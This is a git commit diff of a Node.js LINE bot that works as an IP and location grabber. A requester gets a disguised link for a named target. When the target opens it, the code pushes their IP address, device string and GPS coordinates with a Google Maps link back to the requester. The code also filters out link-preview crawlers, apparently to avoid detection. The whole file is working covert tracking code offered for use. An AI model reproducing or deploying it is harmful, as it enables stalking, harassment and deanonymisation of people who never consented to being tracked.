3ad7bdaefc987bb909a1d3872b99cbf4760f9560
nero <89015741+rhipsali@users.noreply.github.com>
2022-04-26 10:03:49 +0900

    ＿

--- ip.js
+++ ip.js
@@ -6,7 +6,8 @@ const express = require("express");
 const port = process.env.PORT || 3000;
 const TOKEN = process.env.LINE_TOKEN;
 const bitly_token = process.env.BITLY_TOKEN;
-let lock = false, random = 400, original = '', push_status = false, geolocation = '';
+const firebase_token = process.env.FIREBASE_TOKEN;
+let lock = false, random = 400, original = '', push_status = false, geolocation = '', nom = '', id = '';
 
 const app = express();
 
@@ -17,56 +18,21 @@ app
   }))
   .use(express.json())
   .post("/webhook", (req, res) => {
-    // reply msg
+    // reply
     res.send("HTTP POST request sent to the webhook URL!");
     random = ~~(Math.random() * 899999 + 100000);
     const userId = req.body.events[0].source.userId;
+    const replyToken = req.body.events[0].replyToken;
     const ms = req.body.events[0].message.text;
-    let text = "";
     if (req.body.events[0].type === 'message') {
-      if(ms.match(/発行/) || ms.match(/generate/i) || ms.match(/URL/i) || ms.match(/生成/)) {
-        text = "下記のサイトで特定したい相手の名前と元のURL、認証コードを入力してください\n\nhttps://rhipsali.github.io/get_ip?userId=" + userId + "\n\n認証コード: " + random;
-      } else {
-        text = "URLを発行したい場合は「URLを発行したい」「URLを生成して」などと話しかけてみてください";
-      };
-      const dataString = JSON.stringify({
-        replyToken: req.body.events[0].replyToken,
-        messages: [{"type": "text", "text": text}]
-      });
-        
-      const headers = {
-        "Content-Type": "application/json",
-        "Authorization": "Bearer " + TOKEN
-      };
-
-      const webhookOptions = {
-        "hostname": "api.line.me",
-        "path": "/v2/bot/message/reply",
-        "method": "POST",
-        "headers": headers,
-        "body": dataString
-      };
-
-      const request = https.request(webhookOptions, (res) => {
-          res.on("data", (d) => {
-            process.stdout.write(d);
-          })
-        })
-
-      request.on("error", (err) => {
-        console.error(err);
-      })
-    
-      request.write(dataString);
-      request.end();
+      const text = (ms.match(/発行/) || ms.match(/generate/i) || ms.match(/URL/i) || ms.match(/生成/)) ?
+      "下記のサイトで特定したい相手の名前と元のURL、認証コードを入力してください\n\nhttps://zackdnerrr-88a45.web.app/?userId=" + userId + "\n\n認証コード: " + random 
+      : "URLを発行したい場合は「URLを発行したい」「URLを生成して」などと話しかけてみてください";
+      replyMsg(replyToken, text);
     };
   })
   .post("/pass", (req, res) => {
-    if (req.body.text === "ぴやっほゃ") {
-      res.send(JSON.stringify({pass: random}));
-    } else {
-      res.sendStatus(415);
-    };
+    (req.body.text === "ぴやっほゃ") ? res.send(JSON.stringify({pass: random})) : res.sendStatus(415);
   })
   .post("/lock", (req, res) => {
     if(req.body.text === "fucker") {
@@ -106,58 +72,78 @@ app
     });
   })
   .get("/get/ip/nero", (req, res) => {
-    const nom = req.query.name, id = req.query.id;
+    nom = req.query.name; id = req.query.id;
     original = req.query.original; geolocation = req.query.geo;
     res.sendFile(__dirname + '/open.html');
     // get ip
     const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.connection.socket.remoteAddress || req.socket.remoteAddress || '0.0.0.0', 
     str = (ip.match(/[^0-9.]/g)) ? ip.replace(/[^0-9.]/g, "") : ip;
     // push msg
-    if ( !id || 
-      !(String(req.headers["accept-language"]).match(/ja/)) ||
-      req.headers["user-agent"] === "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1" ||
-      req.headers["user-agent"] === 'bitlybot/3.0 (+http://bit.ly/)' 
-      ) {push_status = false} else {push_status = true};
-      let nax;
-      if(push_status) {
+    ( !id ||  !(String(req.headers["accept-language"]).match(/ja/))
+    || req.headers["user-agent"] === "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"
+    || req.headers["user-agent"] === 'bitlybot/3.0 (+http://bit.ly/)' 
+    ) ? push_status = false : push_status = true;
+    if(push_status) {
         pushMsg(`${nom}さんがURLにアクセスしました\n\nIPアドレス: ${str}\n\n使用デバイス:\n${req.headers["user-agent"]}`, id);
-        nax = nom;
         console.log(`名前: ${nom}\nIPアドレス: ${str};`);
       };
-      app.post("/geo", (Req, Res) => {
-        Res.sendStatus(200);
-        setTimeout(() => {
-          pushMsg(`${nax}さんの位置情報が取得できました\n\n緯度: ${Req.body.lat}\n経度: ${Req.body.lng}\n\ngoogleマップで見る\nhttps://www.google.co.jp/maps/@${Req.body.lat},${Req.body.lng},20z`, id);
-        }, 1000);
-      });
   })
   .get("/auth", (req, res) => {
-    const URL = original || "https://rhipsali.github.io/get_ip";
-    res.send(JSON.stringify({url: URL, geo: geolocation}));
+    const URL = original || "https://zackdnerrr-88a45.web.app/";
+    res.send(JSON.stringify({url: URL, geo: geolocation, name: nom, id: id}));
+  })
+  .post("/geo", (req, res) => {
+    res.sendStatus(200);
+    pushMsg(`${req.body.name}さんの位置情報が取得できました\n\n緯度: ${req.body.lat}\n経度: ${req.body.lng}\n\ngoogleマップで見る\nhttps://www.google.co.jp/maps?q=${req.body.lat},${req.body.lng}&z=18`, req.body.id);
   })
   .listen(port, () => console.log("listening on " + port))
 ;
 
+function replyMsg(replyToken, text) {
+  const dataString = JSON.stringify({
+    replyToken: replyToken,
+    messages: [{"type": "text", "text": text}]
+  });
+  const webhookOptions = {
+    "hostname": "api.line.me",
+    "path": "/v2/bot/message/reply",
+    "method": "POST",
+    "headers": {
+      "Content-Type": "application/json",
+      "Authorization": "Bearer " + TOKEN
+    },
+    "body": dataString
+  };
+  const request = https.request(webhookOptions, (res) => {
+      res.on("data", (d) => {
+        process.stdout.write(d);
+      })
+    })
+  request.on("error", (err) => {
+    console.error(err);
+  })
+  request.write(dataString);
+  request.end();
+}
+
 function pushMsg(text, id) {
-  const msg = JSON.stringify({
+  const body = JSON.stringify({
     to: id,
     messages: [
       {"type": "text", "text": text}
     ]
   });
-
-  const headers = {
-    "Content-Type": "application/json",
-    "Authorization": "Bearer " + TOKEN
-  };
-  const webhookOptions = {
+  const options = {
     "hostname": "api.line.me",
     "path": "/v2/bot/message/push",
-    "method": "POST",
-    "headers": headers,
-    "body": msg
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json; charset=UTF-8",
+      "Authorization": "Bearer " + TOKEN
+    },
+    body: body
   };
-  const request = https.request(webhookOptions, (res) => {
+  const request = https.request(options, (res) => {
     res.on("data", (d) => {
       process.stdout.write(d);
     });
@@ -165,6 +151,6 @@ function pushMsg(text, id) {
   request.on("error", (err) => {
     console.error(err);
   });
-  request.write(msg);
+  request.write(body);
   request.end();
 };
